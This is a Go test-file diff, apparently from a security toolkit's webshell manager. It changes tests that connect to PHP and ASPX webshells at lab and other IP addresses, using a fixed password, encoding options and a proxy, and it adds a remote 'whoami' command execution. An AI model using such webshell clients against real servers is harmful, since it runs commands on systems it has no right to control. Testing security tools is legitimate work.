@@ -520,44 +520,22 @@ func TestInjectWebappComponent(t *testing.T) {
 	assert.True(t, strings.Contains(string(plugin), "success"))
 
 }
-func TestYakShellPhp(t *testing.T) {
-	url := "http://10.211.55.2:8093/1.php"
-	manager, err := NewYakShellManager(url,
-		SetYakShellTool(),
-		SetPass("1"),
-		SetBase64(),
-		SetShellScript("php"),
-		SetProxy("socks5://127.0.0.1:8083"),
-		SetTimeout(10),
-		SetHeaders(map[string]string{
-			"test": "test",
-		}),
-		SetPosts(map[string]string{
-			"test": "test",
-		}),
-		SetBase64AesDec())
-	if err != nil {
-		panic(err)
-	}
-	ping, err := manager.BasicInfo()
-	if err != nil {
-		panic(err)
-	}
-	fmt.Println(string(ping))
-}
 
 func TestYakShellJsp(t *testing.T) {
 	//url := "http://localhost:8080/tomcat_war_exploded/el.jsp"
-	url := "http://47.120.44.219:8087/shell.aspx"
+	//url := "http://localhost:8080/tomcat_war_exploded/sessionEvil2.jsp"
+	//url := "http://127.0.0.1:8093/123321.php"
+	url := "http://10.211.55.3:8076/testsession.aspx"
 	manager, err := NewYakShellManager(url,
 		SetYakShellTool(),
 		SetPass("1"),
+		SetPosts(map[string]string{"test": "test"}),
 		SetBase64(),
 		SetShellScript(ypb.ShellScript_ASPX.String()),
-		SetProxy("socks5://127.0.0.1:8083"),
+		SetProxy("http://127.0.0.1:8922"),
 		SetTimeout(10),
 		SetBase64Dec(),
-		//SetBase64AesDec(),
+		SetSession(),
 	)
 	if err != nil {
 		panic(err)
@@ -567,4 +545,9 @@ func TestYakShellJsp(t *testing.T) {
 		panic(err)
 	}
 	fmt.Println(ping)
+	exec, err := manager.CommandExec("whoami")
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println(string(exec))
 }
